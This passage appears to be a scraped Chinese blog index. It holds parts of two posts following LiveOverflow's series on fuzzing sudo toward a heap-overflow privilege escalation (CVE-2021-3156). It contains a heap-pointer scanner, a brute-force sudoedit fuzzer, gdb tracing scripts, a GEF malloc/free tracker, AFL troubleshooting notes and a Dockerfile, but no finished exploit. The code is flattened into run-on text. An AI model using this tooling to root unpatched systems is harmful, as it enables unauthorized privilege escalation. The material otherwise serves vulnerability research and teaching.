/usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack] 编写python脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384vmmap=&#x27;&#x27;&#x27;0x00555555554000 0x0055555555b000 0x00000000000000 r-- /pwd/sudo_test/src/sudo0x0055555555b000 0x005555555d6000 0x00000000007000 r-x /pwd/sudo_test/src/sudo0x005555555d6000 0x005555555f4000 0x00000000082000 r-- /pwd/sudo_test/src/sudo0x005555555f4000 0x005555555f5000 0x0000000009f000 r-- /pwd/sudo_test/src/sudo0x005555555f5000 0x005555555f9000 0x000000000a0000 rw- /pwd/sudo_test/src/sudo0x005555555f9000 0x00555555637000 0x00000000000000 rw- [heap]0x007ffff7cc1000 0x007ffff7d02000 0x00000000000000 rw-0x007ffff7d02000 0x007ffff7d05000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d05000 0x007ffff7d0c000 0x00000000003000 r-x /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0c000 0x007ffff7d0e000 0x0000000000a000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0e000 0x007ffff7d0f000 0x0000000000b000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0f000 0x007ffff7d10000 0x0000000000c000 rw- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d10000 0x007ffff7d16000 0x00000000000000 rw-0x007ffff7d16000 0x007ffff7d1d000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache0x007ffff7d1d000 0x007ffff7d4f000 0x00000000000000 r-- /usr/lib/locale/C.UTF-8/LC_CTYPE0x007ffff7d4f000 0x007ffff7d51000 0x00000000000000 rw-0x007ffff7d51000 0x007ffff7d73000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7d73000 0x007ffff7eeb000 0x00000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7eeb000 0x007ffff7f39000 0x0000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f39000 0x007ffff7f3d000 0x000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f3d000 0x007ffff7f3f000 0x000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f3f000 0x007ffff7f43000 0x00000000000000 rw-0x007ffff7f43000 0x007ffff7f45000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f45000 0x007ffff7f56000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f56000 0x007ffff7f5c000 0x00000000013000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5c000 0x007ffff7f5d000 0x00000000019000 --- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5d000 0x007ffff7f5e000 0x00000000019000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5e000 0x007ffff7f5f000 0x0000000001a000 rw- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5f000 0x007ffff7f65000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f65000 0x007ffff7f76000 0x00000000006000 r-x /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f76000 0x007ffff7f7c000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7c000 0x007ffff7f7d000 0x0000000001c000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7d000 0x007ffff7f7e000 0x0000000001d000 rw- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7e000 0x007ffff7f82000 0x00000000000000 rw-0x007ffff7f82000 0x007ffff7f84000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7f84000 0x007ffff7f99000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7f99000 0x007ffff7fb3000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb3000 0x007ffff7fb4000 0x00000000030000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb4000 0x007ffff7fb5000 0x00000000031000 rw- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb5000 0x007ffff7fbd000 0x00000000000000 rw-0x007ffff7fbd000 0x007ffff7fbe000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fbe000 0x007ffff7fbf000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fbf000 0x007ffff7fc0000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc0000 0x007ffff7fc1000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc1000 0x007ffff7fc2000 0x00000000003000 rw- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc2000 0x007ffff7fc4000 0x00000000000000 rw-0x007ffff7fca000 0x007ffff7fce000 0x00000000000000 r-- [vvar]0x007ffff7fce000 0x007ffff7fcf000 0x00000000000000 r-x [vdso]0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]&#x27;&#x27;&#x27;import structmemmap = []for mem in vmmap.splitlines(): if &#x27;r-x&#x27; in mem: start, end, size, perm, f = mem.split(&#x27; &#x27;) start = int(start, 16) end = int(end, 16) memmap.append((start, end))with open(&#x27;/pwd/heap&#x27;,&#x27;rb&#x27;) as f: heap = f.read()n = 0x41for i in range(0, len(heap), 8): heap_addr = i+0x005555555f9000 b = heap[i:i+8] q = struct.unpack(&#x27;Q&#x27;, b)[0] for mem in memmap: if q&gt;=mem[0] and q&lt;=mem[1]: # print(f&quot;0x&#123;heap_addr:016x&#125;: &#123;q:016x&#125; &#123;b&#125;&quot;) print(f&quot;set *0x&#123;heap_addr:016x&#125; = 0x&quot;+(hex(n)[2:]*5)) n += 1 if 0x000055555561b4d0 == heap_addr: print(f&quot;0x&#123;heap_addr:016x&#125;: our [buffer]&quot;) 得到结果 能堆溢出的堆在最下面，不能覆写任何函数指针，艹 重新分析，判断找到的函数是否真的被执行了，作者这里修改了他的脚本 12345678910111213n = 0x41for i in range(0, len(heap), 8): heap_addr = i+0x005555555f9000 b = heap[i:i+8] q = struct.unpack(&#x27;Q&#x27;, b)[0] for mem in memmap: if q&gt;=mem[0] and q&lt;=mem[1]: # print(f&quot;0x&#123;heap_addr:016x&#125;: &#123;q:016x&#125; &#123;b&#125;&quot;) print(f&quot;set *0x&#123;heap_addr:016x&#125; = 0x&quot;+(hex(n)[2:]*5)) n += 1 if 0x000055555561b4d0 == heap_addr: print(f&quot;0x&#123;heap_addr:016x&#125;: our [buffer]&quot;) 生成不会造成crash的文件 1echo -en &quot;0edit\\x00-s\\x000000000&quot; &gt; /tmp/normal 在gdb中设置这些值 12345678910111213set *0x00005555556149a8 = 0x4141414141set *0x00005555556149b0 = 0x4242424242set *0x0000555555615260 = 0x4343434343set *0x0000555555615268 = 0x4444444444set *0x0000555555617e00 = 0x4545454545set *0x0000555555617eb0 = 0x4646464646set *0x0000555555618378 = 0x4747474747set *0x0000555555618398 = 0x4848484848set *0x00005555556183b8 = 0x4949494949set *0x00005555556183d8 = 0x4a4a4a4a4aset *0x00005555556184d8 = 0x4b4b4b4b4bset *0x0000555555619b40 = 0x4c4c4c4c4cset *0x000055555561a0b0 = 0x4d4d4d4d4d 取消断点继续，应该就会出现一些报错了 &gt;&gt;问题 没有出现报错，并且直接执行了 脚本的相关的地址写错了 发现一个红黑树! 结果看到compar变量被我们覆盖了，说明函数真的被调用了，如果我们能覆盖compar地址，那么就能改写函数指针。重复这些过程就可以找到更多的函数指针。比如修改输入类型，然后把输入换成普通输入，set *0x000055555561a0b0 = 0x4d4d4d4d4d换掉，得到另一个crash 强制堆分配 在上一节中，能溢出的buffer位于最底层，不能更改能被使用的函数指针，所以尝试暴力取溢出长度，看看能不能分配到上面一点的位置。 核心思想是随机输入到sudoedit，然后调用上节找到的函数时，打印该函数指针和打印堆溢出的chunk 改写sudo源码 真实环境下的sudo和测试下的sudo是两个二进制文件，为了贴近正式的环境，要尽量的贴近真实情况下的sudo 添加打印参数Chunk地址 已上一节的红黑树为例，打印compar的值 忘写分号了 12./configure &amp;&amp; makeln -s /pwd/sudo_test/src/.libs/sudo ./src/.libs/sudoedit 作者在这里踩了坑，我想复现下，不想看的可以略过 虽然报错的方式不一样，但是结果和原因都是一样的。一个都是libsudo这个库找不到，作者的问题是使用的是系统变量中的库，但是这个库不含有printf即其他输出，自然也就没法打印字符串 &gt;&gt;问题 没有反应 找找是不是代码写的文件是其他文件的代码 所以使用make install安装方法就好了，只要之前make过一次之后就都可以了 堆溢出发生时，程序并不会立即crash，而是会进入到红黑树的部分，但是能溢出的user_args地址在rbtree1地址后面，所以依然无法利用 暴力测试脚本 尝试构造不同的输入，看看能不能有路径可以把函数指针放在我们能溢出的chunk后面的 输入来源 stdin 文件(files) 协议参数(arguments) 环境变量(env vars) 设置长度 123456# define some common size values usable for different inputs_SIZES = [i for i in range(0,0xff)]_SIZES += [2**i for i in range(0,15)]_SIZES += [(2**i)+1 for i in range(0,15)]_SIZES += [(2**i)-1 for i in range(0,15)]_SIZES += ([0]*50) sudo参数协议(sudo help) 1234567# define some flags from sudo -hARG1 = [&quot;-A&quot;,&quot;-B&quot;,&quot;-E&quot;,&quot;-e&quot;,&quot;-H&quot;,&quot;-K&quot;,&quot;-k&quot;,&quot;-l&quot;,&quot;-n&quot;,&quot;-P&quot;,&quot;-S&quot;,&quot;-s&quot;]ARG1 += [None, None, None, None, None, None, None]ARG2 = _SIZESARG3 = _SIZESHOSTNAME = _SIZESENV = _SIZES 设置测试集 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# dump a testcase into a logfiledef dump_file(fname, lines, ptrs, arg, env, key): # create the folders if they don&#x27;t exist directory = os.path.dirname(fname) if not os.path.exists(directory): os.makedirs(directory) # don&#x27;t write the dump file if it&#x27;s already too large if os.path.isfile(fname) and Path(fname).stat().st_size &gt; 200000: return # write to file with open(fname, &#x27;a+&#x27;) as f: f.write(&quot;----------------------------\\n&quot;) f.write(lines[1].decode(&#x27;ascii&#x27;)) if key: distance = ptrs[key] - ptrs[b&#x27;user_args&#x27;] f.write(f&quot;user_args &lt; &#123;key.decode(&#x27;ascii&#x27;)&#125;\\n&quot;) f.write(f&quot;distance: 0x&#123;distance:x&#125;\\n&quot;) if key: f.write(f&quot;0x&#123;ptrs[b&#x27;user_args&#x27;]:016x&#125; &lt; 0x&#123;ptrs[key]:016x&#125;\\n&quot;) f.write(&quot;args: sudoedit &quot;) f.write(&quot; &quot;.join(arg)) f.write(&quot;\\n\\n&quot;) for k in env: f.write(f&quot;&#123;k&#125;=&#123;env[k]&#125;\\n&quot;) f.write(&quot;\\n&quot;) f.write(lines[0].decode(&#x27;ascii&#x27;)) f.write(&quot;\\n&quot;) test = &#123;&#125; test[&#x27;arg&#x27;] = arg test[&#x27;env&#x27;] = env f.write(json.dumps(test)) f.write(&quot;\\n\\n&quot;)# this will run sudoedit with a set of arguments and environment variablesdef run_sudoedit(arg, env): print(&quot;-------------&quot;) # disable stdout buffering with stdbuf wrapping around sudoedit # and add the commandline arguments _cmd = [&quot;/usr/bin/stdbuf&quot;, &quot;-o0&quot;, &quot;/usr/local/bin/sudoedit&quot;] + arg # execute it p = subprocess.Popen(_cmd, env=env, bufsize=0, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) try: # send some newlines and check if we get any output lines = p.communicate(b&quot;x\\nx\\nx\\nx\\n&quot;, timeout=0.1) except subprocess.TimeoutExpired: # terminate on timeout p.terminate() lines = p.communicate() if p.returncode == -11: print(f&quot;SEGFAULT&quot;) # read the list of function pointers ptrs = &#123;&#125; skipping = True for line in lines[0].splitlines(): key,val = line.split(b&#x27;=&#x27;) if key == b&#x27;user_args&#x27;: skipping = False if not skipping: ptrs[key] = int(val,16) # go through all function pointers if ptrs and b&#x27;user_args&#x27; in ptrs: for key in ptrs: if key != b&#x27;user_args&#x27;: # is our overflow buffer before a function pointer? if ptrs[b&#x27;user_args&#x27;] &lt; ptrs[key]: distance = ptrs[key] - ptrs[b&#x27;user_args&#x27;] if distance&lt;14000: fname = f&#x27;&#123;FOLDER&#125;/&#123;distance&#125;&#x27; dump_file(fname, lines, ptrs, arg, env, key) # did we get a segfault? if p.returncode == -11: fname = f&quot;&#123;FOLDER&#125;/crashes/segfault_&#123;distance&#125;&quot; dump_file(fname, lines, ptrs, arg, env, None) return returnALPHABET = &#x27;0123456789ABCDEFGHIKLMNOPQRSTUVWXYZ&#x27; fuzz主要功能 12345678910111213141516171819202122232425262728# fuzz loopwhile True: # select random size values arg1 = random.choice(ARG1) rand_arg2_size = random.choice(ARG2) rand_arg3_size = random.choice(ARG3) rand_hostname_size = random.choice(HOSTNAME) rand_env_size = random.choice(ENV) arg = [] env = &#123;&#125; # arguments # ... -s AAAAAAA\\ ... if arg1: arg.append(arg1) arg.append(&quot;-s&quot;) arg.append(random.choice(ALPHABET)*rand_arg2_size + &quot;\\\\&quot;) if rand_arg3_size: arg.append(random.choice(ALPHABET)*rand_arg3_size) # environment variables if rand_hostname_size: env[&quot;HOSTNAME&quot;] = random.choice(ALPHABET)*rand_hostname_size if rand_env_size: env[random.choice(ALPHABET)*3] = random.choice(ALPHABET)*rand_env_size # run sudoedit run_sudoedit(arg, env) 开始fuzz 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# this will run sudoedit with a set of arguments and environment variablesdef run_sudoedit(arg, env): print(&quot;-------------&quot;) # disable stdout buffering with stdbuf wrapping around sudoedit # and add the commandline arguments _cmd = [&quot;/usr/bin/stdbuf&quot;, &quot;-o0&quot;, &quot;/usr/local/bin/sudoedit&quot;] + arg # execute it p = subprocess.Popen(_cmd, env=env, bufsize=0, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) try: # send some newlines and check if we get any output lines = p.communicate(b&quot;x\\nx\\nx\\nx\\n&quot;, timeout=0.1) except subprocess.TimeoutExpired: # terminate on timeout p.terminate() lines = p.communicate() if p.returncode == -11: print(f&quot;SEGFAULT&quot;) # read the list of function pointers ptrs = &#123;&#125; skipping = True for line in lines[0].splitlines(): key,val = line.split(b&#x27;=&#x27;) if key == b&#x27;user_args&#x27;: skipping = False if not skipping: ptrs[key] = int(val,16) # go through all function pointers if ptrs and b&#x27;user_args&#x27; in ptrs: for key in ptrs: if key != b&#x27;user_args&#x27;: # is our overflow buffer before a function pointer? if ptrs[b&#x27;user_args&#x27;] &lt; ptrs[key]: distance = ptrs[key] - ptrs[b&#x27;user_args&#x27;] if distance&lt;14000: fname = f&#x27;&#123;FOLDER&#125;/&#123;distance&#125;&#x27; dump_file(fname, lines, ptrs, arg, env, key) # did we get a segfault? if p.returncode == -11: fname = f&quot;&#123;FOLDER&#125;/crashes/segfault_&#123;distance&#125;&quot; dump_file(fname, lines, ptrs, arg, env, None) return return 最后发现chunk位置相差太远不同 ，根本无法利用 GDB工具编写 阶段 1 要改进上面的暴力脚本，就要知道我对的分配情况，我们也可以在gdb里面在每次malloc下断点查看size参数。 更为便捷的技巧是查看free时候的指针的地址的值，如果是我们认识的字符串，那么我们就能控制到哪里 123456789set breakpoint pending onbreak freecommands silent printf &quot;free(): %s\\n&quot;,$rdi continueendrun -s &#x27;SSSSSSSSSSSSSSSSSSSSSYYY\\&#x27; 运行 1gdb -x ./gdb.init /usr/local/bin/sudoedit &gt; free_trace 发现有环境变量，再次尝试设置环境变量 发现根本没变，要是我们尝试更多的环境变量呢？ 阶段 2 直接在加载环境变量（getenv(3p)）的时候下断点，看看用了那些 12345678910set breakpoint pending onbreak getenvcommands silent printf &quot;getenv(): %s\\n&quot;,$rdi continueendrun -s &#x27;SSSSSSSSSSSSSSSSSSSSSYYY\\&#x27; 发现可以设置的环境变量值 再次改写脚本 12345678910111213141516171819202122232425262728set breakpoint pending onset environment LOCPATH = HEAP0set environment LC_ALL = HEAP1set environment LC_IDENTIFICATION = HEAP2set environment LANG = HEAP3set environment LC_MEASUREMENT = HEAP4set environment LC_TELEPHONE = HEAP5set environment LC_ADDRESS = HEAP6set environment LC_NAME = HEAP7set environment LC_PAPER = HEAP8set environment LC_MESSAGES = HEAP9set environment LC_MONETARY = HEAPAset environment LC_COLLATE = HEAPBset environment LC_TIME = HEAPCset environment LC_NUMERIC = HEAPDset environment LC_CTYPE = HEAPEset environment GCONV_PATH = HEAPFset environment TZ = HEAPGset environment SHELL = HEAPIbreak freecommands silent printf &quot;free(): %s\\n&quot;,$rdi continueendrun -s &#x27;SSSSSSSSSSSSSSSSSSSSSYYY\\&#x27; 所以可以从这些地方下手来构建更好的暴力测试工具，同时作者也在第一份暴力测试工具中犯了很多错误。用github上的改进版本能快速找到能利用的点 或许利用点在于覆写环境变量？ 阶段 3 这时里exp还很远，也可以尝试下分析堆溢出过后还有哪些地方申请 作者直接写了一个gef的拓展工具 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149# gdb -ex &#x27;gef config gef.extra_plugins_dir &quot;/pwd/gef&quot;&#x27; -ex &#x27;gef save&#x27; -ex quit__AUTHOR__ = &quot;liveoverflow&quot;__VERSION__ = 0.1import collectionsimport gdbimport json# persist &quot;database&quot; to the filedef dump(j): with open(&#x27;/tmp/malloc.json&#x27;, &#x27;w&#x27;) as f: f.write(json.dumps(j))# load &quot;database&quot; from the filedef load(): with open(&#x27;/tmp/malloc.json&#x27;, &#x27;r&#x27;) as f: j = json.loads(f.read()) return j# handler for malloc() breakpointsclass MallocBreakpoint(gdb.Breakpoint): def __init__(self, location, *args, **kwargs): super(MallocBreakpoint, self).__init__(location, gdb.BP_BREAKPOINT, internal=False) self.silent = True self.size = None self.addr = None return # malloc() breakpoint triggered def stop(self): log = &#123;&#125; # extract information about this malloc() log[&quot;size&quot;] = get_register(&quot;$rdi&quot;) log[&quot;rip&quot;] = get_register(&quot;$rip&quot;) log[&quot;backtrace&quot;] = gdb.execute(&#x27;bt&#x27;, to_string=True) log[&#x27;name&#x27;] = gdb.newest_frame().older().name() # set a breakpoint at the malloc() return if log[&#x27;name&#x27;] and &#x27;set_cmnd&#x27; in log[&#x27;name&#x27;]: self.retbp = MallocReturnBreakpoint(log=log, overwrite=gdb.newest_frame().older()) return False self.retbp = MallocReturnBreakpoint(log=log) return False# breakpoint for the return of a malloc()class MallocReturnBreakpoint(gdb.FinishBreakpoint): def __init__(self, log, overwrite=False, *args, **kwargs): if not overwrite: overwrite = gdb.newest_frame() super(MallocReturnBreakpoint, self).__init__(overwrite, internal=False) self.silent = False self.log = log def stop(self): # extract some information self.log[&#x27;addr&#x27;] = get_register(&quot;$rax&quot;) self.log[&#x27;name&#x27;] = gdb.newest_frame().name() # load the mallocs() we logged before MALLOCS = load() # add this malloc to the known allocations MALLOCS[str(self.log[&#x27;addr&#x27;])] = self.log dump(MALLOCS) # this is the location of our overflowing buffer # now we can dump the heap analysis if self.log[&#x27;name&#x27;] and &#x27;set_cmnd&#x27; in self.log[&#x27;name&#x27;]: print(&quot;YYYYYYYYYYY WE ARE IN!!!&quot;) addr = get_register(&quot;$rax&quot;) mallocs = [int(a) for a in MALLOCS] mallocs.sort() SHOW = 5 out = &#x27;&#x27; for mall in mallocs: if mall &gt; addr and SHOW&gt;0: h = MALLOCS[str(mall)] for line in h[&#x27;backtrace&#x27;].split(&#x27;\\n&#x27;)[1:]: if line: l = line.split() print(l) if l[3] != &#x27;??&#x27;: out += (l[3]) + &quot; &quot; out += &quot;\\n&quot; SHOW -= 1 out += &quot;\\n&quot; print(out) with open(&#x27;/tmp/heap&#x27; ,&#x27;w&#x27;) as f: f.write(out) return True return False# set a breakpoint on free()class FreeBreakpoint(gdb.Breakpoint): def __init__(self, location, *args, **kwargs): super(FreeBreakpoint, self).__init__(location, gdb.BP_BREAKPOINT, internal=False) self.silent = True self.size = None self.malloc = [] self.addr = None return def stop(self): log = &#123;&#125; log[&quot;addr&quot;] = get_register(&quot;$rdi&quot;) # check if the memory freed was allocated before MALLOCS = load() if str(log[&quot;addr&quot;]) in MALLOCS: # remove this object from the list of allocated objects del MALLOCS[str(log[&quot;addr&quot;])] dump(MALLOCS) return False# the gdb command that starts the heap traceclass SudoeditCommand(GenericCommand): &quot;&quot;&quot;Tracks a function given in parameter for arguments and return code.&quot;&quot;&quot; _cmdline_ = &quot;sudoedit&quot; _syntax_ = f&quot;&#123;_cmdline_&#125;&quot; def do_invoke(self, args): dump(&#123;&#125;) self.bkps = [] # set the breakpoints self.bkps.append(MallocBreakpoint(location=&quot;__libc_malloc&quot;)) self.bkps.append(FreeBreakpoint(location=&quot;__libc_free&quot;)) #self.bkps.append(MallocBreakpoint(location=&quot;malloc&quot;)) #self.bkps.append(ReallocBreakpoint(location=&quot;__libc_calloc&quot;)) #self.bkps.append(ReallocBreakpoint(location=&quot;__libc_realloc&quot;)) #self.bkps.append(FreeBreakpoint(location=&quot;free&quot;)) gdb.events.exited.connect(self.cleanup) return def cleanup(self, events): print(&quot;CLEANUP!!!&quot;) for bp in self.bkps: bp.delete() gdb.events.exited.disconnect(self.cleanup) returnif __name__ == &quot;__main__&quot;: register_external_command(SudoeditCommand()) 设置插件 1gdb -ex &#x27;gef config gef.extra_plugins_dir &quot;/pwd/gef2&quot;&#x27; -ex &#x27;gef save&#x27; -ex quit 使用 1gdb -ex &#x27;set breakpoint pending on&#x27; -ex &#x27;sudoedit&#x27; -ex &#x27;r -s xxxxxxxxxxxxxxxxxx&#x27; -ex &#x27;sudoedit&#x27; -ex &#x27;continue&#x27; /usr/local/bin/sudoedit | tee heap.log 主要就是跟踪malloc和free在堆溢出之后的行为 只有将这个改写到暴力脚本里面，找到符合条件的Chunk","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"}]},{"title":"SUDO堆溢出提权：从fuzz到exp [2]","slug":"sudo-fuzz2exp-2","date":"2022-04-13T03:12:03.000Z","updated":"2022-09-20T08:04:42.490Z","comments":true,"path":"2022/04/13/sudo-fuzz2exp-2/","link":"","permalink":"https://joe1sn.eu.org/2022/04/13/sudo-fuzz2exp-2/","excerpt":"SUDO堆溢出提权：从fuzz到exp [2] 前文：https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ 受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程 原始视频合集：https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx 原始Blog：https://liveoverflow.com/why-pick-sudo-research-target-part-1/ 原作者代码仓库：https://github.com/LiveOverflow/pwnedit","text":"SUDO堆溢出提权：从fuzz到exp [2] 前文：https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ 受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程 原始视频合集：https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx 原始Blog：https://liveoverflow.com/why-pick-sudo-research-target-part-1/ 原作者代码仓库：https://github.com/LiveOverflow/pwnedit My previous blog: https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ I was inspired by the LiveOverflow’s Sudo Vulnerability Walkthrough on youtube, but i found there’s no Chinese version of this walkthrough tutorial, so i decided to write in experimental report way to create this “from fuzz to exploit” series. Original Videos: https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx Original Blog: https://liveoverflow.com/why-pick-sudo-research-target-part-1/ Source Project Code: https://github.com/LiveOverflow/pwnedit 本节内容： Troubleshooting AFL Fuzzing Problems | Ep. 03 Finding Buffer Overflow with Fuzzing | Ep. 04 Found a Crash Through Fuzzing? Minimize AFL Testcases! | Ep. 05 Root Cause Analysis With AddressSanitizer (ASan) | Ep. 06 Understanding C Pointer Magic Arithmetic | Ep. 07 C Code Review - Reaching Vulnerable Code in sudo | Ep. 08 解决AFL的小麻烦 因为时间原因，我并不能一直开着电脑跑，不过我翻译一下作者遇到的问题 No more free CPU cores 作者在遇到fuzz很慢的时候，尝试关闭一个fuzz，然后重启 然后使用ps aux产看全部运行过程，发现afl在尝试fuzz这些奇怪的东西（因为sudo中可能会有exec之类的）。然后pkill vi关闭所有vi的进程就短暂的解决了这个问题。 **解决：**彻底解决的话要关闭所有在sudo中的exec相关函数，然后重新编译 And of Disk Space 作者查看空间使用情况过后发现磁盘空间充足，但是任然不能创建文件 但是使用df -i查看inode节点，发现被占满了 **inode (index node)**是指在许多“类Unix文件系统”中的一种数据结构，用于描述文件系统对象（包括文件、目录、设备文件、socket、管道等）。每个inode保存了文件系统对象数据的属性和磁盘块位置[1]。文件系统对象属性包含了各种元数据（如：最后修改时间） ，也包含用户组（owner ）和权限数据 说明有过多的细小文件使用光了inode节点号，最后在/var/tmp找到了这些文件，原因是fuzz的时候产生了例如../../的路径穿越。 **解决：**手动在sudo要创建文件的时候添加上一个crash，这里用空指针引用 12printf(&quot;mk tmp file(%s)\\n&quot;,stuff);*(int *)0=0; 之后开始fuzz 然后分析crash 但是又引入了新的问题： root和普通用户相同吗？ 这里就要说到sudo的原理，sudo是通过在root条件下使用setuid的方式来让普通用户指令得到root执行。 比如我们在user下fuzz，但是真实情况会将它变为root下运行 如果要在fuzz时实现真实情况的效果，那么就要将当前用户uid设置为普通用户的 sudo-1.8.31p2/src/sudo.c get_user_info 1234ud-&gt;uid = 1000//getuid();ud-&gt;euid = geteuid();ud-&gt;gid = 1000//getgid();ud-&gt;egid = getegid(); 忘写分号了 找到缓冲区溢出 作者用上一节的fuzz得到了一些ctash样本，本章内容讲的基本上是分析这些样本 gdb调试 和我预料的一样，这样做会产生大量的非sudo从而crash的样本，可以用以下命令查看 12grep -R sudoedit file_floder/grep -R sudo file_floder/ 为了方便分析，可以安装一些gdb的插件，如pwndbg，也在CVE分析的文章里讲过了该插件的安装(不要放在共享文件夹/pwd下安装) 有的crash是由于fuzzer的错误引起的，作者使用了这段代码判断 1234567#include &quot;argv-fuzz-inl.h&quot;int main(int argc, char *argv[], char *envp[])&#123; AFL_INIT_ARGV(); // argv is now the fake argv execve(&quot;/usr/local/bin/sudo&quot;, argv, envp);&#125; 作者遇到的第一个问题是argv-fuzz-inl中的ret数组造成的栈溢出，覆写了其他的函数指针造成crash 解决 如果rc比最大参数数量大时退出循环 更换fuzzer 使用更好的fuzzer：AFL++ 项目地址：https://github.com/AFLplusplus/AFLplusplus AFL++支持对命令行的fuzz，所以之前的修改要去掉 要新建镜像的话，可以在Dockerfile中加上 1RUN cd /root/ &amp;&amp; git clone https://github.com/AFLplusplus/AFLplusplus &amp;&amp; cd AFLplusplus &amp;&amp; make source-only &amp;&amp; make install 1234567891011FROM ubuntu:20.04ENV LC_CTYPE C.UTF-8ARG DEBIAN_FRONTEND=noninteractiveRUN apt-get update &amp;&amp; apt-get install -yq gcc make wget curl git vim gdb clang llvm lld llvm-dev bsdmainutils libstdc++-10-dev python3 python3-pip python3-dev automake flex bison build-essential libglib2.0-dev libpixman-1-dev python3-setuptools RUN cd /root/ &amp;&amp; wget https://www.sudo.ws/dist/sudo-1.8.31p2.tar.gz &amp;&amp; tar -xvf sudo-1.8.31p2.tar.gz &amp;&amp; cd sudo-1.8.31p2 &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make installRUN cd /root/ &amp;&amp; git clone https://github.com/AFLplusplus/AFLplusplus &amp;&amp; cd AFLplusplus &amp;&amp; make source-only &amp;&amp; make installRUN useradd -ms /bin/bash userRUN echo &#x27;export PS1=&quot;\\[\\e]0;\\u@\\h: \\w\\a\\]\\[\\033[01;31m\\]\\u\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]# &quot;&#x27; &gt;&gt; /root/.bashrcRUN echo &#x27;export PS1=&quot;\\[\\e]0;\\u@\\h: 